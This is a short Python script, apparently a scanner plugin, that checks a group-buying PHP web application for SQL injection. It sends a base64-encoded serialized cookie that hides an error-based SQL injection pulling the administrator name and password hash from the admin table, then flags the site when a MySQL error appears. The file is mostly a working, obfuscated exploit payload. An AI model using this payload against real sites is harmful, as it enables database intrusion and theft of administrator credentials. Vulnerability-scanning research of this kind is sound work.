#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "fangweituangou":
        return True, arg

def audit(arg):  
    payload = 'index.php'
    cookie = 'email=czoxOTE6IidBTkQgKFNFTEVDVCAxIEZST00oU0VMRUNUIENPVU5UKCopLENPTkNBVCgoU0VMRUNUIFNVQlNUUklORyhDT05DQVQoYWRtX25hbWUsMHg3YyxhZG1fcHdkLDB4N2MpLDEsNjApIEZST00gdDFfYWRtaW4gTElNSVQgMCwxKSxGTE9PUihSQU5EKDApKjIpKVggRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIEdST1VQIEJZIFgpYSkjIjs=;password=0;'
    
    target = arg + payload
    code, head, res, errcode, final_url = curl.curl('-b %s %s' % (cookie,target))
    
    if code == 200:  
    	if "[message] => MySQL Query Error" in res:
			security_hole('find sql injection: ' + arg+'index.php')

if __name__ == "__main__":
	from dummy import *
	audit(assign('fangweituangou', 'http://www.example.com/')[1])